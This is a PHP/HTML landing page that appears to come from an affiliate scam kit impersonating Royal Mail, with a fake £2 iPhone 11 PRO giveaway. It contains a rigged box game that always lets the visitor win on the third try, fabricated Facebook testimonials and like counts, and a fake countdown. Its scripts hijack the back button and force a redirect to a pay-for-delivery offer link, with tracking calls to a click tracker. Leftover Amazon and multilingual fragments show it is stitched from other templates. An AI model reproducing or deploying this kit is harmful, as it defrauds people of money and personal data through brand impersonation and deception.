<?php
function getRandomElement($arr)
{
    $keys = array_keys($arr);
    $len = count($keys);
    $rand = mt_rand(0, $len - 1);
    $index = $keys[$rand];
    return [$index, $arr[$index]];
}

function makeUpdateTokenURL($TRACKER_URL, $indexes)
{
    $s = $TRACKER_URL . '/click.php?lp=data_upd&';
    foreach ($indexes as $tokenName => $tokenValue) {
        $s .= "{$tokenName}={$indexes[$tokenName]}&";
    }
    $s = rtrim($s, "&");
    return $s;
}

function getChosen($blockSet, $randomOptions)
{
    $indexes = array();
    $result = array();
    $temp = $_COOKIE['temp'];

    foreach ($blockSet as $blockName => $values) {
        $indexes[$blockName] = [];
        $result[$blockName] = [];

        if (!isset($randomOptions[$blockName]) || $randomOptions[$blockName] === "random") {
            list($index, $element) = getRandomElement($values);
        } else {
            $index = $randomOptions[$blockName];
            $element = $values[$index];
        }

        $indexes[$blockName] = $index;
        $result[$blockName] = $element;

        if (!empty($temp)) {
            $indexes[$blockName] = $temp;
            $result[$blockName] = $values[$temp];
        }
    }
    return [$indexes, $result];
}

// Здесь указываем ваш домен трекера
$TRACKER_DOMAIN = 'https://yourprofit.today/';

// Указываем название LP токена, который будет в трекере, его значение и то, что будет подставляться в код основной страницы
$bricks = [
    // Ссылки
    'link' => [
        "1" => [
            'url' => 'https://dl-domain.monster/click.php?lp=1&to_offer=1',
            'img' => 'off1/phone.png',
            'price' => '£2',
            'chek' => 'off1/chek-im.jpg',
            'konvert' => 'off1/konvert.png'
        ],
        "2" => [
            'url' => 'https://dl-domain.monster/click.php?lp=1&to_offer=2',
            'img' => 'off2/phone.png',
            'price' => '£2',
            'chek' => 'off2/chek-im.jpg',
            'konvert' => 'off1/konvert.png'

        ],
        "3" => [
            'url' => 'https://dl-domain.monster/click.php?lp=1&to_offer=3',
            'img' => 'off3/phone.png',
            'price' => '£2',
            'chek' => 'off3/chek-im.jpg',
            'konvert' => 'off1/konvert.png'

        ],
    ]
];

$randomOptions = [
    // Все доступные варианты
    "link" => "random"
];

list($indexes, $result) = getChosen($bricks, $randomOptions);
setcookie("temp", $indexes['link'], time() + 31536000, "/");

$updateTokensURL = makeUpdateTokenURL($TRACKER_DOMAIN, $indexes);

$updateLPTokensScript = <<<EOT
    <script type="text/javascript">
    var o = document.createElement("img");
    o.src="{$updateTokensURL}";
    </script>
EOT;
?>

<!DOCTYPE html>
<?php echo $updateLPTokensScript; ?>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <link href="index.css?<?= time(); ?>" rel="stylesheet" type="text/css">
    <script src="jquery.min.js"></script>
    <meta content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0" name="viewport">
    <meta content="width=device-width" name="viewport">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="bootstrap.min.css">
    <link rel="stylesheet" href="style.css?<?= time(); ?>">
    <script src="jquery.min-1.js"></script>
    <link href="https://fonts.googleapis.com/css?family=Montserrat:300,400,500&display=swap" rel="stylesheet">
    <link rel="shortcut icon" href="favicon.png">

    <script>

        !function () {
            var t;
            try {
                const URL = window.location.href.split(/[#]/)[0];
                for (t = 0; 10 > t; ++t) history.pushState({}, "", URL + '#')
                onpopstate = function (event) {
                    event.state && location.replace('{offer_link}&event10=1');
                }
            } catch (o) {
                console.log(o);
            }
            setTimeout('location="{offer_link}&event9=1";', 180000);
        }();
    </script>

</head>

<style>

    .logo-box {

        width: 191px;
        margin-top: 8px;
    }

    @media (max-width: 767px) {
        .boxes > div {
            height: 140px;
        }

        .commimg {
            width: 100%;
        }
    }

    @media only screen and (max-width: 920px) {
        .block-i {
            position: absolute;
            top: 19px;
            left: 19px;
        }

        .header {
            height: 57px;
            background: #fff;
        }

        .logo-box {


            width: 159px;
            margin-top: 2px;
        }

        .fcentr {
            justify-content: space-between;
        }

        .menu-left {
            float: left;
            width: 60px;
            height: 56px;
            background: url(mobile-header-sprite.png) no-repeat left top, #ff0000;
        }

        .phone-right {
            float: right;
            width: 60px;
            height: 56px;
            background: url(mobile-header-sprite.png) no-repeat right bottom;
        }


    }

    @media (max-width: 500px) {
        .boxes > div {
            height: 120px;
        }

        .dblock1 {
            display: none;
        }


    }

    @media (max-width: 400px) {
        .boxes > div {

        }
    }
</style>

<body class="" cz-shortcut-listen="true">


<div class="secondPage">

    <script>
        var mydate = new Date();
        mydate.setDate(mydate.getDate() - 0);
        var year = mydate.getYear();
        if (year < 1000) year += 1900;
        var day = mydate.getDay();
        var month = mydate.getMonth();
        var daym = mydate.getDate();
        var timers = mydate.getHours() + ':' + mydate.getMinutes() + ':' + mydate.getSeconds();
        if (daym < 10) daym = "0" + daym;
        var dayarray = new Array("Dimanche", "Lundi", "Mardi", "Mercredi", "Jeudi", "Vendredi", "Samedi")
        var montharray = new Array("Janvier", "Février", "Mars", "Avril", "Mai", "Juin", "Juillet", "Août", "Septembre", "Octobre", "November", "Décembre")
    </script>
    <script>
        function fdate(e) {
            var a = new Date;
            a.setDate(a.getDate() - e);
            var t = a.getYear();
            t < 1e3 && (t += 1900);
            var r = (a.getDay(), a.getMonth()),
                n = a.getDate();
            n < 10 && (n = "0" + n);
            var o = (new Array("Január", "Február", "Március", "Április", "Május", "Június", "Július", "August",
                "septiembre", "Október", "November", "December"));
            return "" + o[r] + " " + n
        }

        var monthNames = new Array("January", "February", "March", "April", "May", "June", "July", "August",
            "septiembre", "October", "November", "December"),
            now = new Date;
        now.setDate(now.getDate() + 1);
        var nowStringTommorow = monthNames[now.getMonth()] + " " + now.getDate() + ", " + now.getFullYear();

        var mydate = new Date;
        mydate.setDate(mydate.getDate() - 0);
        var year = mydate.getYear();
        year < 1e3 && (year += 1900);
        var day = mydate.getDay(),
            month = mydate.getMonth(),
            daym = mydate.getDate();
        daym < 10 && (daym = "0" + daym);

        var dayarray = new Array("Every sunday", "every monday", "Every tuesday", "Every wednesday", "Every thursday", "Every friday", "Every saturday"),
            montharray = new Array("Gennaio", "February", "March", "April", "May", "June", "July", "August", "septiembre", "October", "November", "December")
    </script>

    <div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true"
         style="display: none;">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-body">
                    <table>
                        <tbody>
                        <tr>
                            <td>
                                <img src="logo-desctop.png" alt=""
                                     style="max-width: 157px; display: block; margin: 5px auto 25px auto;">
                                <style>
                                    .phone_block {
                                        width: 100%;
                                        display: flex;
                                        flex-direction: column;
                                        align-items: center;
                                    }

                                    .phone_imgg {
                                        width: 200px;
                                        margin-bottom: 20px;
                                    }

                                    .phone_pic {
                                        width: 100%;
                                    }

                                    .Description_head {
                                        color: #000;
                                        font-size: 14px;
                                        font-weight: 500;
                                        padding: 20px;
                                    }

                                    .logo-box_pic {
                                        width: 50%;
                                    }
                                </style>

                                <div class="phone_block">
                                    <div class="phone_imgg">
                                        <img src="<?= $result["link"]["img"]; ?>" alt="" class="phone_pic">
                                    </div>
                                </div>
                                <p style="font-size: 16px; color: #000; text-align: center;">

                                    Today, <span>
										<script>
											document.write(fdate(0))
										</script></span> we launched a loyalty program for our clients and
                                     we give away 99 iPhones 11 PRO for <?= $result["link"]["price"]; ?>. The campaign lasts
                                     only 1 day! We wish you very much
                                     success!
                                </p>

                            </td>
                        </tr>
                        </tbody>
                    </table>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-primary" data-dismiss="modal"
                            style=" border-radius:6px; background:  #DC0101; color: #fff; letter-spacing: .3;  padding: 10px 35px; font-size: 16px"
                            id="btn-open">OK
                    </button>
                </div>
            </div>
        </div>
    </div>

    <div class="header">
        <div style="max-width: 970px; margin: 0 auto;display: flex; height: 53px; position: relative;" class="fcentr">

            <a href="{offer_link}" target="_blank">
                <div class="menu-left"></div>
            </a>
            <div class="logo-box">
                <img src="logo-desctop.png" alt="" class="logo-box_pic">
            </div>
            <div class="nav-bar" style="height: 20px;">
                <a href="{offer_link}" target="_blank">Homepage</a>
                <a href="{offer_link}" target="_blank">About the company</a>
                <a href="{offer_link}" target="_blank">Press office</a>
            </div>
            <a href="{offer_link}" target="_blank">
                <div class="phone-right"></div>
            </a>
        </div>
    </div>
    <style>
        .secondPage > .wrapper_main {
            margin-top: 60px;
            min-height: 85vh;
            width: 100%;
        }

        @media only screen and (max-width: 720px) {
            .secondPage > .wrapper_main {
                margin-top: 37px;
            }
        }
    </style>
    <div class="spacer"></div>
    <div class="wrapper wrapper_main">
        <div class="wrapper contestwrap" style="padding: 0; width: 100%;">
            <div class="toptext"
                 style="float: none; margin: 0 auto; display: block; text-align: center; color:#fff !important; font-size: small; background: url(920x4000.jpg?2); background-position: center; background-size: cover; font-family: 'Texta Regular', Helvetica, Arial;">

                <table class="wrapper">
                    <tbody>
                    <tr>

                        <td align="left" valign="top">
                            <br>
                            <h4 style="float: none; margin: 0px auto -10px auto; display: block; text-align: center; font-weight: 700; color: #fff; font-size: 20px;">
                                Congratulations! Once a year, we launch a loyalty program for our
                                 customers. Do not lose this chance!</h4> <br>


                            <style>
                                .phone_block {
                                    width: 100%;
                                    display: flex;
                                    flex-direction: column;
                                    align-items: center;
                                }

                                .phone_img {
                                    width: 300px;
                                }

                                .phone_pic {
                                    width: 100%;
                                }

                                .Description_head {
                                    color: #000;
                                    font-size: 14px;
                                    font-weight: 500;
                                    padding: 20px;
                                }
                            </style>

                            <div class="phone_block">
                                <div class="phone_img">
                                    <img src="<?= $result["link"]["img"]; ?>" alt="" class="phone_pic">
                                </div>
                            </div>


                        </td>
                    </tr>
                    </tbody>
                </table>
                <div style="border-bottom:1px solid #ebebeb; margin-top: 10px;">
                    <p class="wrapper" style="font-size: 16px; color: #fff;">
                        Every year Royal Mail and its partners present the latest Iphone models to their
                         customers. We are delighted that you are using our postal service and we offer
                         Get the iPhone 11 PRO for <?= $result["link"]["price"]; ?> today. Here are 6 boxes behind which the
                         present. You have 3 tries, open 3 boxes and see if you win. If you win, you will need to enter your address
                         shipping and pick up your new smartphone.
                        <br> <br></p>
                    <p class="wrapper" style="font-size: 16px; color: #fff;">

                        <b> Good luck, you only have 3 tries!</b> <br> <br></p>
                </div>
                <script>
                    function startTimer(t) {
                        var e, r, n = t,
                            a = setInterval(function () {
                                e = parseInt(n / 60, 10), r = parseInt(n % 60, 10), r = 10 > r ? "0" + r : r, $("#timerr").text(e + " minutes " + r + " seconds"), --n < 0 && clearInterval(a)
                            }, 1e3)
                    }

                    startTimer(89)
                </script>
                <style>
                    .select2 {
                        color: #737373;
                        font-size: small;
                        font-weight: 300;
                        padding: 8px 0 4px 0
                    }
                </style>
                <!-- <div class="wrapper select2" style="font-size: 14px;color: #fff;"> <b> Important: </b> Only 3 prizes left. </div> -->
            </div>
        </div>
       

        <div id="boxes" class="boxes" style="background:#f7f7f7;">
            <div id="0"><img src="_mark1-2.png?2" class="try">
            </div>
            <div id="1"><img src="_mark1-2.png?2" class="try">
            </div>
            <div id="2"><img src="_mark1-2.png?2" class="try">
            </div>
            <div id="3"><img src="_mark1-2.png?2" class="try">
            </div>
            <div id="4"><img src="_mark1-2.png?2" class="try">
            </div>
            <div id="5"><img src="_mark1-2.png?2" class="try">
            </div>


        </div>
        <script>
            var count = 1;
            $(function () {
                $(".try").click(function () {
                    if (count < 3) {
                        $(this).attr('src', "_mark2-2.png?2");
                        count++;
                        setTimeout(function () {
                            var sc2 = document.getElementById("success02");
                            sc2.className += " animate";
                            var sctip02 = document.getElementById("successtip02");
                            sctip02.className += " animateSuccessTip";
                            var md2 = document.getElementById("modal02");
                            md2.className += " visible";
                            var so = document.querySelector(".sweet-overlay");
                            so.style.display = "block";
                        }, 800);
                    } else {
                        $(this).attr('src', "_mark3-3.png?2");
                        setTimeout(function () {
                            var modal03 = document.getElementById("modal03").className += " visible";
                            var sa = document.querySelector(".sweet-overlay").style.display = "block";
                        }, 800);
                    }

                });

            });

           
        </script>
        <script>
            function drawszlider(e, d) {
                var l = Math.round(100 * d / e);
                document.getElementById("szliderbar").style.width = l + "%", document.getElementById("szazalek").innerHTML = l + "%", holvanszlider = d, t = setTimeout("drawszlider(100, slidewhere);slidewhere = holvanszlider + 1; if (slidewhere > 100) {slidewhere = 100;}", 40)
            }

            var slidewhere = 0,
                holvanszlider = 0
        </script>
        <div class="wrapper reviews">

            <!--HeadFB-->
            <div class="wrapper wrapperfbhead">
                <h2>Commented on <span style="color: #4267b2;font-weight: bold; ">Royal Mail</span> public
                    post</h2>
                <div class="fblog">
                    <i class="fbpic"></i>
                </div>

            </div>
            <div class="comfbdivider"></div>
            <!--HeadFB-->

            <!--StyleFbLike-->
            <style>
                .wrapperfbhead {
                    padding: 15px 0px 5px 0px;
                    display: flex;
                    flex-direction: row;
                    align-items: center;
                    justify-content: space-between;
                }

                .wrapperfbhead > h2 {
                    padding: 0px 0px 0px 9px;
                    font-size: 13px;
                    margin: 0;
                }

                .comfbdivider {
                    border-bottom: 1px solid #EBEDF0;
                    margin-bottom: 20px;
                    padding: 0px 0 9px 0px;
                }

                .fblog > i {
                    background-position: 0 0;
                    background-image: url(fblpack.png);
                    background-size: auto;
                    background-repeat: no-repeat;
                    display: inline-block;
                    height: 24px;
                    width: 24px;
                }

                .fbllog {

                    padding: 0 0 0 8px;
                    display: flex;
                    flex-direction: row;
                    justify-content: center;
                    text-align: center;
                    position: relative;
                }

                .fbllog > i {
                    width: 20px;
                    height: 20px;
                    background-position: 0;
                    background-image: url(likefb.svg);
                    background-size: auto;
                    background-repeat: no-repeat;
                    display: inline-block;

                }

                .fbllog > span {
                    color: #385898;
                    font-size: 16px;
                    padding: 0 0 0 4px;
                }

                .roundimg {
                    border-radius: 0;
                }

                .otvet {
                    font-size: 16px;
                    display: flex;
                    flex-direction: row;
                    padding: 0;
                }

                .otvet > span {
                    color: #385898;
                    cursor: pointer;
                    text-decoration: none;
                    font-size: 16px;
                }

                .otvet > span:hover {
                    text-decoration: underline;
                }

                .comfbdate {
                    padding-bottom: 9px;
                    padding-left: 14px;
                }

                .tl {
                    font-size: 16px;
                }

                .fbllog > .fbpic-like {
                    position: absolute;
                }

                .fbllog > .fbpic-like:hover, .fbllog > .fbpic-heart:hover, .fbllog > .fbpic-wow:hover, .fbllog > i:hover {
                    width: 22px;
                    height: 22px;
                }

                .fbllog > .fbpic-heart, .fbllog > .fbpic-wow {
                    position: absolute;
                    right: -12px;
                    background-image: url(heartfb.svg);
                }

                .fbllog > .fbpic-wow {
                    background-image: url(wowfb.svg);
                }

                .fbllog-2lik {
                    width: 32px;
                }

                .otvet-2l > .lcount {
                    padding: 1px 0px 0 14px;
                }
            </style>
            <!--StyleFbLike-->

            <table class="wrapper" style=" padding-bottom: 10px; padding-top: 10px; " id="fb5">
                <tbody>
                <tr>
                    <td width="50px" valign="top" align="right">
                        <div class="roundimg s-11m"></div>
                    </td>
                    <td align="left" valign="top" class="commentpad">
                        <div class="name">
                            Olivia Smith
                        </div>
                        <div class="text">I just won a new Iphone 11 Pro! This is the best
                             Present!
                        </div>

                        <div class="qqq">


                            <!--fblikes-->
                            <div class="kkk">

                                <a href="{offer_link}" target="_blank" class="otvet otvet-2l">
                                    <span class="tl">Like</span>
                                    <div class="fbllog fbllog-2lik">
                                        <i class="fblpic fbpic-like"></i><i class="fblpic fbpic-heart"></i>
                                    </div>
                                    <span class="lcount">41</span>&nbsp;&nbsp;
                                    Comment&nbsp;&nbsp;
                                    Share
                                </a>
                                <div class="date comfbdate">
                                    <script>
                                        document.write(fdate(0))
                                    </script>
                                    at 10:56
                                </div>
                            </div>
                            <!--fblikes-->


                        </div>

                    </td>
                </tr>
                </tbody>
            </table>
            <table class="wrapper" id="fb4" style="padding-bottom: 10px; padding-top: 10px; display: none;">
                <tbody>
                <tr>
                    <td width="50px" valign="top" align="right">
                        <div class="roundimg s-33m"></div>
                    </td>
                    <td align="left" valign="top" class="commentpad">
                        <div class="name">Luke Johnson</div>
                        <div class="text">At first I thought it was a joke, but this morning I got the new Iphone 11
                            Pro!
                        </div>
                        <div class="qqq">
                            <div class="kkk">
                                <div class="date">
                                    <script>
                                        document.write(fdate(1))
                                    </script>
                                    at 3:33
                                </div>
                                <a href="{offer_link}" target="_blank" class="otvet">
                                    Like&nbsp;&nbsp;
                                    Comment&nbsp;&nbsp;
                                    Share</a>
                            </div>
                        </div>
                    </td>
                </tr>
                </tbody>
            </table>
            <table class="wrapper" id="fb3" style="padding-bottom: 10px; padding-top: 10px;">
                <tbody>
                <tr>
                    <td width="50px" valign="top" align="right">
                        <div class="roundimg s-66"></div>
                    </td>
                    <td align="left" valign="top" class="commentpad">
                        <div class="name">Samuel Adamson</div>
                        <div style="display: flex; flex-direction: column;" class="text">
                            <div>
								At first I thought it was a joke, but this morning I have a new iPhone 11 Pro to buy!
                            </div>
                            <div><img src="<?= $result["link"]["chek"]; ?>" class="commimg" width="400"
                                      style="margin-top: 5px; margin-bottom: 10px;"></div>
                        </div>
                        <div class="qqq">

                            <!--FBLikes-->
                            <div class="kkk">

                                <a href="{offer_link}" target="_blank" class="otvet otvet-2l">
                                    <span class="tl">Like</span>
                                    <div class="fbllog fbllog-2lik">
                                        <i class="fblpic fbpic-like"></i><i class="fblpic fbpic-wow"></i>
                                    </div>
                                    <span class="lcount">137</span>&nbsp;&nbsp;
                                    Comment&nbsp;&nbsp;
                                    Share
                                </a>
                                <div class="date comfbdate">
                                    <script>
                                        document.write(fdate(0))
                                    </script>
                                    at 10:56
                                </div>
                            </div>
                            <!--FBLikes-->
                        </div>
                    </td>
                </tr>
                </tbody>
            </table>
            <table class="wrapper" id="fb2" style="padding-bottom: 10px; padding-top: 10px; ">
                <tbody>
                <tr>
                    <td width="50px" valign="top" align="right">
                        <div class="roundimg s-99"></div>
                    </td>
                    <td align="left" valign="top" class="commentpad">
                        <div class="name">Jack Aldridge</div>
                        <div class="text">I have a new version of Iphone 11 Pro!</div>
                        <div class="qqq">

                            <!--FBCOM-->
                            <div class="kkk">

                                <a href="{offer_link}" target="_blank" class="otvet otvet-2l">
                                    <span class="tl">Like</span>
                                    <div class="fbllog fbllog-2lik">
                                        <i class="fblpic fbpic-like"></i><!--<i class="fblpic fbpic-heart"></i>-->
                                    </div>
                                    <span style="padding: 0;" class="lcount">17</span>&nbsp;&nbsp;
                                    Comment&nbsp;&nbsp;
                                    Share
                                </a>
                                <div class="date comfbdate">
                                    <script>
                                        document.write(fdate(0))
                                    </script>
                                    at 10:56
                                </div>
                            </div>
                            <!--FBCOM-->

                        </div>
                    </td>
                </tr>
                </tbody>
            </table>
            <table class="wrapper" id="fb1" style=" padding-bottom: 10px; padding-top: 10px;">
                <tbody>
                <tr>
                    <td width="50px" valign="top" align="right">
                        <div class="roundimg s-88m"></div>
                    </td>
                    <td align="left" valign="top" class="commentpad">
                        <div class="name">Amelia Brown</div>
                        <div class="text">It is true !!!
                            <div class="qqq">

                                <!--FBCOM-->
                                <div class="kkk">

                                    <a href="{offer_link}" target="_blank" class="otvet otvet-2l">
                                        <span class="tl">Like</span>
                                        <div class="fbllog fbllog-2lik">
                                            <i class="fblpic fbpic-like"></i><i class="fblpic fbpic-heart"></i>
                                        </div>
                                        <span class="lcount">32</span>&nbsp;&nbsp;
                                        Comment&nbsp;&nbsp;
                                        Share
                                    </a>
                                    <div class="date comfbdate">
                                        <script>
                                            document.write(fdate(0))
                                        </script>
                                        at 10:56
                                    </div>
                                </div>
                                <!--FBCOM-->

                                <!--<div class="like-q">
                                    <img src="FB-like.png" alt="" style="margin-right: 2px; margin-top: -1px;">1
                                </div>-->
                            </div>
                        </div>
                    </td>
                </tr>
                </tbody>
            </table>
            <table class="wrapper" style="padding-bottom: 10px; padding-top: 10px;display: none">
                <tbody>
                <tr>
                    <td width="50px" valign="top" align="right">
                        <div class="roundimg ps4man"></div>
                    </td>
                    <td align="left" valign="top" class="commentpad">
                        <div class="name">Joseph Evans</div>
                        <div class="text">I won Phone11! I can't believe this was true ....</div>
                        <div class="qqq">
                            <div class="kkk">
                                <div class="date">
                                    <script>
                                        document.write(fdate(3))
                                    </script>
                                    at 10:51
                                </div>
                                <a href="{offer_link}" target="_blank" class="otvet">
                                    Like&nbsp;&nbsp;
                                    Comment&nbsp;&nbsp;
                                    Share</a>
                            </div>
                        </div>
                    </td>
                </tr>
                </tbody>
            </table>
            <table class="wrapper" style="padding-bottom: 10px; padding-top: 10px; display: none;">
                <tbody>
                <tr>
                    <td width="50px" valign="top" align="right">
                        <div class="roundimg s-102m"></div>
                    </td>
                    <td align="left" valign="top" class="commentpad">
                        <div class="name">Thomas Davies</div>
                        <div class="text">WoW!!</div>

                        <div class="qqq">
                            <div class="kkk">
                                <div class="date">
                                    <script>
                                        document.write(fdate(3))
                                    </script>
                                    at 8:23
                                </div>
                                <a href="{offer_link}" target="_blank" class="otvet">
                                    Like&nbsp;&nbsp;
                                    Comment&nbsp;&nbsp;
                                    Share</a>
                            </div>
                        </div>
                    </td>
                </tr>
                </tbody>
            </table>
            <div style="height:10px"></div>
        </div>
    </div>
    <footer>
        <div class="footer-block">
            <div class="footer-top">
                <p style="text-align: center;"><img src="footer-logo.png" alt="" width="120px"
                                                    style="padding-bottom: 1px"></p>
                <p style="text-align: center;"><a href="{offer_link}" target="_blank"><img src="footer-icon.png" alt=""
                                                                           width="275px"></a></p>
            </div>
            <span style="display: block; margin: 0 auto;">
				© 2017 Royal Mail. <br>
				All rights reserved. <br>
				<a href="{offer_link}" target="_blank"></a>
				</span>
        </div>
    </footer>
    <script src="jquery.js"></script>

    <div class="sweet-overlay" style="opacity: 1.03; display: none;" tabindex="-1"></div>
    <div class="sweet-alert animated bounceIn" id="modal01" style="color: #222;">

        <h2 style="font-size: 13pt;">Amazon promotional contest</h2>
        <p> Congratulations, Amazon customer!<br><br>We care about you
             thank you for your loyalty to Amazon! In honor of Black Friday
             2018, we offer you the opportunity to get the<b>Apple news </b> from today !<br><br>All
             than
             you have to do is find the right gift package.<br><br><b>You have 3 attempts, good luck!</b>
        </p>
        <div class="sa-button-container">
            <div class="sa-confirm-button-container">
                <button onclick="hidemodal01()"
                        style="display: inline-block; box-shadow: rgba(140, 212, 245, 0.8) 0px 0px 2px, rgba(0, 0, 0, 0.0470588) 0px 0px 0px 1px inset; background-color: ##dc1928; color: #fff;">
                    OK
                </button>
                <div class="la-ball-fall"></div>
            </div>
        </div>
    </div>
    <div class="sweet-alert animated bounceIn" id="modal02" style="color: #222;">
        <div class="sa-icon sa-success" id="success02">
            <span class="sa-line sa-tip" id="successtip02"></span> <span class="sa-line sa-long"
                                                                         id="successlong02"></span>
            <div class="sa-placeholder"></div>
            <div class="sa-fix"></div>
        </div>
        <script type="text/javascript">

            var counter = 1;
            $(document).ready(function () {

                $('#update').on('click', function () {
                    if (counter == 1) {
                        counter++;
                        $('#cntVal').html(function (i, val) {
                            return +val - 1
                        });
                    }
                });
            });
        </script>
        <p id="cnt" style="color: #222;">

            Sorry, this box is empty. You have (<span id="cntVal">2</span>) lucky attempts!
        </p>
        <div class="sa-button-container">
            <div class="sa-confirm-button-container">
                <button id="update" onclick="hidemodal02()" style="display: inline-block;  margin-top:15px;">OK</button>
                <div class="la-ball-fall"></div>
            </div>
        </div>
    </div>
    <div class="sweet-overlay" style="opacity: 1.03; display: none;" tabindex="-1"></div>
    <div class="sweet-alert animated bounceIn" id="modal03" style="background: #f3f3f3;
    color: #222427;"><img
                src="_mark3-3.png?2" width="150" align="center" onclick="tellme();">
        <h4 style="font-size: 18px; margin-top: 10px;" class="newclr">Congratulations you won!
        </h4>
        <p class="newclr">To receive a gift, please fill in your full delivery address and pay
             delivery service on our website. Without this information, we cannot offer you the iPhone 11 PRO
             deliver !!</p>


        <a href="{offer_link}" target="_blank"><input class="final-button"
                                      style="display:block; border-radius:6px; background:  #dc1928; color: #fff; border: none; outline: none; padding: 10px 25px; margin: 0 auto; margin-top: 15px"
                                      id="final-button" type="submit" value="Enter shipping address"></a>

        <!-- Конец -->
    </div>
</div>


<script>
    function ok_btn() {
        $('#light').css('display', 'block');
    }

    function ok_btn2() {
        $('#light2').css('display', 'block');
    }
</script>
<script>
    function hidemodal01() {
        var modal1 = document.getElementById("modal01").classList.remove("visible");
        var so = document.querySelector(".sweet-overlay").style.display = "none";
    }

    function hidemodal02() {
        var modal2 = document.getElementById("modal02").classList.remove("visible");
        var so = document.querySelector(".sweet-overlay").style.display = "none";
    }

    pz = 1;
    /*window.onunload = window.onbeforeunload = function(evt) {
        var message = "Back to the store?";
        if (pz == 1) {
                if (typeof evt == "undefined") evt = window.event;
                if (evt) evt.returnValue = message;
                return message
        }
};*/
</script>
<!-- <script type="text/javascript">
    var campaign_link = "/index.php?lp=1&uclick=bza2whsy";
    $('#final-button').click(function () {
        window.open(campaign_link)
    })
</script> -->


<link rel="stylesheet" href="bootstrap.min-1.css?<?= time(); ?>">
<script src="bootstrap.js"></script>
<script>
    $(document).ready(function () {
        $('.b1').on('click', function (event) {
            $('.q1').css('transform', 'translateX(-100%)');
            $('.q2').css('transform', 'translateX(0%)');
            $('.dot1').removeClass('dot-active');
            $('.dot2').addClass('dot-active');
        });
        $('.b2').on('click', function (event) {
            $('.q2').css('transform', 'translateX(-100%)');
            $('.q3').css('transform', 'translateX(0%)');
            $('.dot2').removeClass('dot-active');
            $('.dot3').addClass('dot-active');
        });
        $('.b3').on('click', function (event) {
            $('.q3').css('transform', 'translateX(-100%)');
            $('.final').css('transform', 'translateX(0%)');
            $('.dot3').removeClass('dot-active');
            $('.dot4').addClass('dot-active');
        });

        $(".firstPage").hide();
        $(".secondPage").fadeIn(100);
        document.title = "Royal Mail";
        $('#myModal').modal('show');


        function changeFav() {
            var link = document.querySelector("link[rel*='icon']") || document.createElement('link');
            link.type = 'image/x-icon';
            link.rel = 'shortcut icon';
            link.href = './post/img/faviconLaposte.ico';
            document.getElementsByTagName('head')[0].appendChild(link);
        }
    });
</script>

</body>
</html>